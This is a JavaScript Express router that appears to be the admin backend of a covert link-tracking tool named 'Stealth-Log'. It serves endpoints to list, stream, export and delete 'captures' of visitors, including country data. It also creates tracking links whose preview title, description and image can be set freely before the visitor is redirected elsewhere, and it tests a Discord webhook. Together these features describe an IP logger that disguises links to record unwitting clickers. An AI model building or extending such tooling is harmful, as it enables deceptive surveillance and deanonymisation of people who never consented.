const express = require('express');
const jwt = require('jsonwebtoken');
const router = express.Router();
const db = require('../db');
const { requireAuth } = require('../middleware/auth');

// Server-Sent Events stream for live dashboard updates
router.get('/stream', (req, res) => {
  const token = req.query.token;
  try { jwt.verify(token, process.env.JWT_SECRET); }
  catch (e) { return res.status(401).end(); }
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders && res.flushHeaders();
  const send = async () => {
    try {
      const s = await db.stats();
      const rows = await db.listCaptures({ limit: 10, offset: 0, search: '', country: '', from: '', to: '', linkId: '' });
      res.write(`data: ${JSON.stringify({ stats: s, recent: rows })}\n\n`);
    } catch (e) { res.write(`event: error\ndata: ${JSON.stringify({ message: e.message })}\n\n`); }
  };
  send();
  const iv = setInterval(send, 5000);
  req.on('close', () => clearInterval(iv));
});

router.get('/stats', requireAuth, async (req, res) => {
  try { res.json(await db.stats()); } catch (e) { res.status(500).json({ error: e.message }); }
});

router.get('/countries', requireAuth, async (req, res) => {
  try { res.json(await db.distinctCountries()); } catch (e) { res.status(500).json({ error: e.message }); }
});

router.get('/captures', requireAuth, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 50, 200);
    const offset = parseInt(req.query.offset) || 0;
    const search = (req.query.search || '').toString();
    const country = (req.query.country || '').toString();
    const from = (req.query.from || '').toString();
    const to = (req.query.to || '').toString();
    const rows = await db.listCaptures({ limit, offset, search, country, from, to });
    const total = await db.countCaptures(search, country, from, to);
    res.json({ rows, total, limit, offset });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

router.get('/captures/:id', requireAuth, async (req, res) => {
  try {
    const row = await db.getCapture(req.params.id);
    if (!row) return res.status(404).json({ error: 'Not found' });
    res.json(row);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

router.delete('/captures/:id', requireAuth, async (req, res) => {
  try { await db.deleteCapture(req.params.id); res.json({ ok: true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

router.delete('/captures', requireAuth, async (req, res) => {
  try { await db.clearAll(); res.json({ ok: true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

router.get('/export.csv', requireAuth, async (req, res) => {
  try {
    const rows = await db.listCaptures({ limit: 100000, offset: 0, search: '', country: '', from: '', to: '' });
    const cols = Object.keys(rows[0] || {});
    const header = cols.join(',');
    const body = rows.map(r => cols.map(c => JSON.stringify(r[c] ?? '')).join(',')).join('\n');
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename="captures.csv"');
    res.send(header + '\n' + body);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

router.get('/export.json', requireAuth, async (req, res) => {
  try {
    const rows = await db.listCaptures({ limit: 100000, offset: 0, search: '', country: '', from: '', to: '' });
    res.setHeader('Content-Disposition', 'attachment; filename="captures.json"');
    res.json(rows);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// Settings
router.get('/settings', requireAuth, async (req, res) => {
  try {
    const all = await db.getAllSettings();
    const obj = {};
    for (const r of all) obj[r.key] = r.value;
    res.json({
      redirect_url: obj.redirect_url || process.env.REDIRECT_URL || 'https://www.google.com',
      discord_webhook_set: !!process.env.DISCORD_WEBHOOK_URL,
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

router.put('/settings', requireAuth, async (req, res) => {
  try {
    const { redirect_url } = req.body || {};
    if (redirect_url) {
      // basic validation
      try { new URL(redirect_url); } catch (e) { return res.status(400).json({ error: 'Invalid URL' }); }
      await db.setSetting('redirect_url', redirect_url);
    }
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

router.post('/test-webhook', requireAuth, async (req, res) => {
  const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
  if (!WEBHOOK) return res.status(400).json({ error: 'DISCORD_WEBHOOK_URL not set' });
  try {
    const r = await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '✅ Stealth-Log webhook test OK' }) });
    res.json({ ok: r.ok, status: r.status });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ── Links (tracking links) ──
router.get('/links', requireAuth, async (req, res) => {
  try { res.json(await db.listLinks()); } catch (e) { res.status(500).json({ error: e.message }); }
});

router.post('/links', requireAuth, async (req, res) => {
  try {
    const { name, slug, redirectUrl, expiresAt, maxVisits, ogTitle, ogDescription, ogImage } = req.body || {};
    if (!redirectUrl) return res.status(400).json({ error: 'redirectUrl required' });
    // validate URL
    try { new URL(redirectUrl); } catch (e) { return res.status(400).json({ error: 'Invalid redirectUrl' }); }
    let r;
    try { r = await db.createLink({ name, slug, redirectUrl, expiresAt, maxVisits, ogTitle, ogDescription, ogImage }); }
    catch (e) { return res.status(409).json({ error: 'Slug already exists or invalid' }); }
    res.json({ ok: true, ...r, url: `${req.protocol}://${req.get('host')}/t/${r.slug}` });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

router.put('/links/:id', requireAuth, async (req, res) => {
  try {
    await db.updateLink(req.params.id, req.body || {});
    res.json({ ok: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

router.delete('/links/:id', requireAuth, async (req, res) => {
  try { await db.deleteLink(req.params.id); res.json({ ok: true }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

router.get('/links/:id/stats', requireAuth, async (req, res) => {
  try {
    const link = await db.getLinkById(req.params.id);
    if (!link) return res.status(404).json({ error: 'Not found' });
    const s = await db.stats(link.id);
    res.json({ link, stats: s });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

module.exports = router;
